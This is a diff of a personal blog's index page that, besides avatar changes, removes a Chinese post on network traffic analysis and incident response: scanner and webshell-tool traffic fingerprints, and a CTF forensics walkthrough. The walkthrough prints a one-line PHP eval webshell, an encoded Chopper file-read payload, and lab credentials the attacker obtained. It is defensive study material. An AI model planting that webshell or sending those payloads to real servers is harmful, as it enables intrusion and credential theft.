@@ -22,7 +22,7 @@
     <link rel="alternative" href="/atom.xml" title="ZER0" type="application/atom+xml">
   
   
-    <link rel="icon" href="/favicon.png">
+    <link rel="icon" href="/assets/head.jpg">
   
   <link rel="stylesheet" type="text/css" href="/./main.0cf68a.css">
   <style type="text/css">
@@ -46,7 +46,7 @@
 <div class="intrude-less">
 	<header id="header" class="inner">
 		<a href="/" class="profilepic">
-			<img src="" class="js-avatar">
+			<img src="/assets/head.jpg" class="js-avatar">
 		</a>
 		<hgroup>
 		  <h1 class="header-author"><a href="/"></a></h1>
@@ -104,7 +104,7 @@
 	<div class="intrude-less">
 		<header id="header" class="inner">
 			<div class="profilepic">
-				<img src="" class="js-avatar">
+				<img src="/assets/head.jpg" class="js-avatar">
 			</div>
 			<hgroup>
 			  <h1 class="header-author js-header-author"></h1>
@@ -154,545 +154,6 @@
           </div>
           <div id="js-content" class="content-ll">
             
-  
-    <article id="post-流量分析" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/04/24/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">流量分析与应急响应</a>
-    </h1>
-  
-
-        
-        <a href="/2023/04/24/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" class="archive-article-date">
-  	<time datetime="2023-04-24T01:44:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-04-24</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>[toc]</p>
-<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/q20010619/article/details/122096176">Shell管理工具流量分析-上（菜刀、蚁剑、冰蝎2.0流量分析）&amp;入侵检测、应急响应资料整理_冰蝎2.0流量特征_OceanSec的博客-CSDN博客</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_32393893/article/details/117574848">CTF之流量分析_ctf 流量分析_shy014的博客-CSDN博客</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/q20010619/article/details/122096176">Shell管理工具流量分析-上（菜刀、蚁剑、冰蝎2.0流量分析）&amp;入侵检测、应急响应资料整理_冰蝎2.0流量特征_OceanSec的博客-CSDN博客</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53577336/article/details/125048353">Webshell工具的流量特征分析（菜刀，蚁剑，冰蝎，哥斯拉）_冰蝎流量特征_告白热的博客-CSDN博客</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/eternitymd/article/details/124492261">菜刀、冰蝎、蚁剑、哥斯拉的流量特征_蚁剑流量特征_呜呼起飞~的博客-CSDN博客</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42880719/article/details/122148345">ctfshow 摆烂杯 writeup_jiajia-cp-1_是Mumuzi的博客-CSDN博客</a></p>
-<h2 id="常见指纹"><a href="#常见指纹" class="headerlink" title="常见指纹"></a>常见指纹</h2><p>过滤语句：http contains “sqlmap”</p>
-<p>Awvs:<br>AWVS扫描器在请求的URL，Headers, Body三项里随机包含了能代表自己的特征信息</p>
-<p>&lt;1&gt; Url: </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">acunetix-wvs-test-for-some-inexistent-file</span><br><span class="line">by_wvs</span><br><span class="line">acunetix_wvs_security_testacunetix</span><br><span class="line">acunetix_wvs</span><br><span class="line">acunetix_test</span><br></pre></td></tr></table></figure>
-
-<p>&lt;2&gt; Headers:</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Acunetix-Aspect-Password:</span><br><span class="line">Cookie: acunetixCookie</span><br><span class="line">Location: acunetix_wvs_security_testX-Forwarded-Host: acunetix_wvs_security_testX-Forwarded-For: acunetix_wvs_security_testHost: acunetix_wvs_security_testCookie: acunetix_wvs_security_testCookie: acunetix</span><br><span class="line">Accept: acunetix/wvs</span><br><span class="line">Origin: acunetix_wvs_security_testReferer: acunetix_wvs_security_testVia: acunetix_wvs_security_testAccept-Language: acunetix_wvs_security_testClient-IP: acunetix_wvs_security_testHTTP_AUTH_PASSWD: acunetix</span><br><span class="line">User-Agent: acunetix_wvs_security_testAcunetix-Aspect-Queries:任意值</span><br><span class="line">Acunetix-Aspect:任意值</span><br></pre></td></tr></table></figure>
-
-<p>&lt;3&gt; Body </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">acunetix_wvs_security_testacunetix</span><br></pre></td></tr></table></figure>
-
-
-
-<p>Appscan:</p>
-<p>Appscan依然在请求的URL，Headers，Body三项里随机包含了能代表自己的特征信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;1&gt;Url</span><br><span class="line">Appscan</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;2&gt; Headers</span><br><span class="line">Content-Type: Appscan</span><br><span class="line">Content-Type: AppScanHeader</span><br><span class="line">Accept: Appscan</span><br><span class="line">User-Agent:Appscan</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;3&gt; Body</span><br><span class="line">Appscan</span><br></pre></td></tr></table></figure>
-
-
-
-<p>Nessus:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;1&gt; Url</span><br><span class="line">nessus</span><br><span class="line">Nessus</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;2&gt; Headers</span><br><span class="line">x_forwarded_for: nessus</span><br><span class="line">referer: nessus</span><br><span class="line">host: nessus</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;3&gt; Body</span><br><span class="line">nessus</span><br><span class="line">Nessus</span><br></pre></td></tr></table></figure>
-
-
-
-<ul>
-<li>x_forwarded_for:nessus</li>
-<li>referer:nessus</li>
-<li>host:nessus</li>
-</ul>
-<p>sqlmap:</p>
-<ul>
-<li>User-Agent:sqlmap1.2.8#stable</li>
-</ul>
-<p>Netsparker: </p>
-<ul>
-<li>X-Scanner:NetsparkerLocation:</li>
-<li>NetsparkerAccept:netsparker&#x2F;chechCookie:</li>
-<li>netsparkerCookie:NETSPARKER</li>
-</ul>
-<h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><h3 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h3><p>1.请求包中会有eval，assert, base64的特征字符（这里如果用eval方法就是eval ,如果是assert方法就是assert）<br>2.payload为base64加密，且为默认为&amp;z0&#x3D;QGluaV9zZXQ… 参数z0对应$_POST[z0]接收到的数据<br>且固定为QGluaV9zZXQ开头</p>
-<h3 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a>蚁剑</h3><p>默认的蚁剑 shell，连接时会请求两次，其请求体只是经过 url 编码</p>
-<p>第一次请求，关闭报错和 magic_quotes，接下来去获取主机的信息</p>
-<p>第二次请求，会把主机目录列出来</p>
-<h3 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h3><h4 id="2-0"><a href="#2-0" class="headerlink" title="2.0"></a>2.0</h4><p>使用 aes 加密发起三次请求</p>
-<p>第一次请求服务端产生密钥写入 session，session 和当前会话绑定，不同的客户端的密钥也是不同的</p>
-<p>第二次请求是为了获取 key，第三次使用 key 的 aes 加密进行通信</p>
-<h4 id="3-0"><a href="#3-0" class="headerlink" title="3.0"></a>3.0</h4><p>使用 aes 加密发起两次请求</p>
-<p>3.0 分析流量发现相比 2.0 少了动态密钥的获取的请求，不再使用随机生成 key，改为取连接密码的 md5 加密值的前 16 位作为密钥</p>
-<p>一次请求为判断是否可以建立连接，少了俩次 get 获取冰蝎动态密钥的行为，第二次发送 phpinfo 等代码执行，获取网站的信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.请求数据包中的content-type字段常见为application/octet-stream；</span><br><span class="line"> 2.内置16个user-agent头</span><br><span class="line"> 3.content-lengt]请求长度，对于密钥交互，获取基本信息来讲，payload都为定长。</span><br></pre></td></tr></table></figure>
-
-<h4 id="4-0"><a href="#4-0" class="headerlink" title="4.0"></a>4.0</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.Accep和Content-Type为弱特征且Content-type:一般为Application/x-www-form-urlencoded，这里可作为辅助特征</span><br><span class="line">2.内置10个user-agent ,每次连接shell时会随机选择一个进行使用.</span><br><span class="line">3.因为冰蝎4.0建立连接的同时，javaw也与目的主机建立tcp连接，每次连接使用本地端口在49700左右</span><br><span class="line">4.冰蝎通讯默认使用长连接，请求头和响应头里会带有 Connection且Connection为 Keep-Alive</span><br><span class="line">5.有固定的请求头和响应头，请求字节头：dFAXQV1LORcHRQtLRlwMAhwFTAg/M</span><br><span class="line">响应字节头：TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd</span><br><span class="line">6.默认时，冰蝎 webshell都有“e45e329feb5d925b” 一串密钥。该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h3><p>支持多种加密</p>
-<p>采用了和冰蝎 3.0 一样的密钥交换方式，哥斯拉建立连接时会发起三次请求，第一次请求数据超级长，建立 session，第二三次请求确认连接</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.user-agent,如果不修改的话会返回使用的jdk信息</span><br><span class="line">2.在请求包的Cookie中有一个非常致命的特征是会在最后出现分号</span><br><span class="line">3.请求Accept和响应中Cache-Control字段（辅助认证）</span><br><span class="line">4.响应包中的数据前16位为MD5+base64+后16位为MD5。</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="做题："><a href="#做题：" class="headerlink" title="做题："></a>做题：</h2><p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/14AyqVEydOREdifeeKvETjg?pwd=vray">https://pan.baidu.com/s/14AyqVEydOREdifeeKvETjg?pwd=vray</a> </p>
-<p>答案链接：链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/17O83AgZSjqV6yKkxGRXfUg?pwd=087q">https://pan.baidu.com/s/17O83AgZSjqV6yKkxGRXfUg?pwd=087q</a><br>提取码：087q </p>
-<p>1、黑客使用的扫描器</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;wvs&quot;</span><br></pre></td></tr></table></figure>
-
-<p>2、先黑客扫描到的后台登陆地址是：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;login&quot;	</span><br></pre></td></tr></table></figure>
-
-<p>在：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;login.php?rec&quot; &amp;&amp; http.request.method==&quot;POST&quot;</span><br></pre></td></tr></table></figure>
-
-<p>3、黑客使用了什么账号密码登陆了web后台</p>
-<p>同二可得到答案</p>
-<p>4、黑客上传的webshell文件名是，内容是什么</p>
-<p>关键词：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval</span><br><span class="line">assert</span><br><span class="line">system</span><br></pre></td></tr></table></figure>
-
-<p>语法</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;eval&quot; &amp;&amp; http.request.method==&quot;POST&quot;</span><br></pre></td></tr></table></figure>
-
-<p>很快的定位到黑客上传的木马的地址：&#x2F;images&#x2F;article&#x2F;a.php</p>
-<p>传的🐎密码为1234</p>
-<p>再：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp contains &quot;[1234]&quot;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryUIPbEBT1j473BLOO</span><br><span class="line">Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;1.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[1234]);?&gt;</span><br><span class="line">------WebKitFormBoundaryUIPbEBT1j473BLOO</span><br><span class="line">Content-Disposition: form-data; name=&quot;keywords&quot;</span><br><span class="line"></span><br><span class="line">............</span><br><span class="line">------WebKitFormBoundaryUIPbEBT1j473BLOO</span><br><span class="line">Content-Disposition: form-data; name=&quot;description&quot;</span><br></pre></td></tr></table></figure>
-
-<p>结果：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.php &lt;?php @eval($_POST[1234]);?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>5、黑客在robots.txt中找到的flag是什么：</p>
-<p>直接搜robots.txt的关键词 Disallow 就好了</p>
-<p>注意大小写</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;Disallow&quot;</span><br></pre></td></tr></table></figure>
-
-<p>得到：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:87b7cb79481f317bde90c116cf36084b</span><br></pre></td></tr></table></figure>
-
-<p>6、黑客找到的数据库密码是多少：</p>
-<p>分析菜刀流量</p>
-<p>搜索：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;1234=&quot;</span><br></pre></td></tr></table></figure>
-
-<p>然后追踪tcp流</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">POST /images/article/a.php HTTP/1.1</span><br><span class="line">User-Agent: Java/1.8.0_171</span><br><span class="line">Host: 192.168.32.189</span><br><span class="line">Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 375</span><br><span class="line"></span><br><span class="line">1234=@eval.(base64_decode($_POST[action]));&amp;action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRj1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JFA9QGZvcGVuKCRGLCJyIik7ZWNobyhAZnJlYWQoJFAsZmlsZXNpemUoJEYpKSk7QGZjbG9zZSgkUCk7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D&amp;z1=L3Zhci93d3cvaHRtbC9kYXRhL2NvbmZpZy5waHA%3DHTTP/1.1 200 OK</span><br><span class="line">Date: Wed, 08 Aug 2018 08:18:05 GMT</span><br><span class="line">Server: Apache/2.2.15 (CentOS)</span><br><span class="line">X-Powered-By: PHP/5.4.45</span><br><span class="line">Content-Length: 1092</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">-&gt;|&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * DouPHP</span><br><span class="line"> * --------------------------------------------------------------------------------------------------</span><br><span class="line"> * ............ 2014-2015 ...............................................................</span><br><span class="line"> * ............: http://www.douco.com</span><br><span class="line"> * --------------------------------------------------------------------------------------------------</span><br><span class="line"> * ..............................................................................................................................................................................</span><br><span class="line"> * ...............http://www.douco.com/license.html</span><br><span class="line"> * --------------------------------------------------------------------------------------------------</span><br><span class="line"> * Author: DouCo</span><br><span class="line"> * Release Date: 2015-06-10</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">// database host</span><br><span class="line">$dbhost   = &quot;10.3.3.101&quot;;</span><br><span class="line"></span><br><span class="line">// database name</span><br><span class="line">$dbname   = &quot;web&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// database username</span><br><span class="line">$dbuser   = &quot;web&quot;;</span><br><span class="line"></span><br><span class="line">// database password</span><br><span class="line">$dbpass   = &quot;e667jUPvJjXHvEUv&quot;;</span><br><span class="line"></span><br><span class="line">// table prefix</span><br><span class="line">$prefix   = &quot;dou_&quot;;</span><br><span class="line"></span><br><span class="line">// charset</span><br><span class="line">define(&#x27;DOU_CHARSET&#x27;,&#x27;utf-8&#x27;);</span><br><span class="line"></span><br><span class="line">// administrator path</span><br><span class="line">define(&#x27;ADMIN_PATH&#x27;,&#x27;admin&#x27;);</span><br><span class="line"></span><br><span class="line">// mobile path</span><br><span class="line">define(&#x27;M_PATH&#x27;,&#x27;m&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">|&lt;-</span><br></pre></td></tr></table></figure>
-
-<p>所以数据库密码为：e667jUPvJjXHvEUv</p>
-<p>7、黑客在数据库中找到的hash_code是什么：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql.query matches &quot;hash_code&quot;</span><br></pre></td></tr></table></figure>
-
-<p>d1c029893df40cb0f47bcf8f1c3c17ac</p>
-<p>8、黑客破解了账号<a href="mailto:&#x69;&#x6a;&#x6e;&#117;&#x40;&#x74;&#x65;&#115;&#x74;&#x2e;&#x63;&#x6f;&#109;">&#x69;&#x6a;&#x6e;&#117;&#x40;&#x74;&#x65;&#115;&#x74;&#x2e;&#x63;&#x6f;&#109;</a>得到的密码是什么</p>
-<p>mysql contains “<a href="mailto:&#x69;&#x6a;&#x6e;&#117;&#x40;&#116;&#x65;&#x73;&#x74;&#x2e;&#99;&#x6f;&#x6d;">&#x69;&#x6a;&#x6e;&#117;&#x40;&#116;&#x65;&#x73;&#x74;&#x2e;&#99;&#x6f;&#x6d;</a>“</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ijnu@test.com b78f5aa6e1606f07def6e839121a22ec.ADMIN</span><br></pre></td></tr></table></figure>
-
-<p>md5解密</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edc123!@#</span><br></pre></td></tr></table></figure>
-
-<p>9、被黑客攻击的web服务器，网卡配置是：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;eth0&quot;</span><br></pre></td></tr></table></figure>
-
-<p>答案：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">-&gt;|eth0      Link encap:Ethernet  HWaddr 00:0C:29:CB:9F:85  </span><br><span class="line">          inet addr:192.168.32.189  Bcast:192.168.32.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::20c:29ff:fecb:9f85/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:1599085 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:2032868 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:476430398 (454.3 MiB)  TX bytes:1041839269 (993.5 MiB)</span><br><span class="line"></span><br><span class="line">eth1      Link encap:Ethernet  HWaddr 00:0C:29:CB:9F:8F  </span><br><span class="line">          inet addr:10.3.3.100  Bcast:10.3.3.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::20c:29ff:fecb:9f8f/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:1174416 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:1032202 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:832835972 (794.2 MiB)  TX bytes:102428452 (97.6 MiB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:2066 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:2066 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:215082 (210.0 KiB)  TX bytes:215082 (210.0 KiB)</span><br></pre></td></tr></table></figure>
-
-<p>10、黑客使用了什么账号登陆了mail系统:</p>
-<p>admin&#x2F;admin!@#pass123</p>
-<p>11、黑客获得的vpn,ip是多少：</p>
-<p>vpn中扫描其他ip最多的就是黑客的内网ip</p>
-<p>10.3.4.3</p>
-<h2 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/terminal/192859.html">https://www.freebuf.com/articles/terminal/192859.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/218407.html">https://www.freebuf.com/articles/system/218407.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/436617932">https://zhuanlan.zhihu.com/p/436617932</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/fox-yu/p/14380849.html">https://www.cnblogs.com/fox-yu/p/14380849.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/v1vvwv/p/Windows-Emergency-Response.html">https://www.cnblogs.com/v1vvwv/p/Windows-Emergency-Response.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1800490?shareByChannel=link#2.9">https://cloud.tencent.com/developer/article/1800490?shareByChannel=link#2.9</a></p>
-<h3 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h3><h4 id="3W1H"><a href="#3W1H" class="headerlink" title="3W1H"></a><strong>3W1H</strong></h4><p>who: 攻击者IP，受害主机是那些，是在那个安全设备上出现的告警</p>
-<p>what：发生了什么攻击行为，是漏扫探测，还是已经打进来了？产品版本是多少？其他未失陷主机有没有这样的漏洞？</p>
-<p>why：是因为开放了不安全端口？还是已有漏洞未修补？为什么前期没有排查出来？还是因为被钓鱼？</p>
-<p>how：具体是怎么攻击的？是不是在野0day？怎么抑制？怎么修补？</p>
-<h4 id="易失性原则"><a href="#易失性原则" class="headerlink" title="易失性原则"></a><strong>易失性原则</strong></h4><p>时效性</p>
-<p>有一定的先后顺序，即最容易丢失的数据，应该最先收集，其它的依次类推。</p>
-<h4 id="要素原则"><a href="#要素原则" class="headerlink" title="要素原则"></a><strong>要素原则</strong></h4><p>主要是抓关键证据，即要素，这些要素包括样本、流量、日志、进程及模块、内存、启动项。</p>
-<h4 id="避害原则"><a href="#避害原则" class="headerlink" title="避害原则"></a><strong>避害原则</strong></h4><p>趋利避害，不能问题还没有解决，反而引入了新的问题。</p>
-<p>失陷主机下线或隔离</p>
-<p>使用来源不明被感染的工具</p>
-<p>钓鱼样本或勒索样本不加密不压缩发送</p>
-<h3 id="应急响应流程"><a href="#应急响应流程" class="headerlink" title="应急响应流程"></a><strong>应急响应流程</strong></h3><p>判断是否是真实攻击，是否是误报</p>
-<p>收集信息：收集客户信息和中毒主机信息，包括样本。</p>
-<p>判断类型：判断是否是安全事件，何种安全事件，勒索、挖矿、断网、等等。</p>
-<p>深入分析：日志分析、进程分析、启动项分析、样本分析。</p>
-<p>清理处置：直接杀掉进程，删除文件，打补丁，抑或是修复文件。</p>
-<p>产出报告：整理并输出完整的安全事件报告。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">流量分析</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2023/04/24/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-rmi专题" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/04/20/rmi%E4%B8%93%E9%A2%98/">rmi专题</a>
-    </h1>
-  
-
-        
-        <a href="/2023/04/20/rmi%E4%B8%93%E9%A2%98/" class="archive-article-date">
-  	<time datetime="2023-04-20T06:46:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-04-20</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>[toc]</p>
-<p>参考：<a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/tutorial/rmi/overview.html">https://docs.oracle.com/javase/tutorial/rmi/overview.html</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
